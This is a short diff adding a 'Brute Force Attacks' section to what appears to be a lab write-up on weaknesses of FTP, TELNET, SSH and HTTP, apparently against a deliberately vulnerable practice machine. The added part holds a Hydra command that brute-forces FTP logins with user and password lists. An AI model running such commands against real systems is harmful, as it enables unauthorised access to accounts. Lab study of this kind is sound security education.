@@ -45,3 +45,14 @@ This lab explores the weaknesses of network protocols (FTP, TELNET, SSH, HTTP) b
 -postgres
 -www
 -msfadmin
+
+
+---
+
+## 🔐 2. Brute Force Attacks
+
+### 2.1 FTP / TELNET / SSH with Hydra
+
+#### FTP Brute Force
+```bash
+hydra -L users.txt -P passwords.txt ftp://<target-ip>
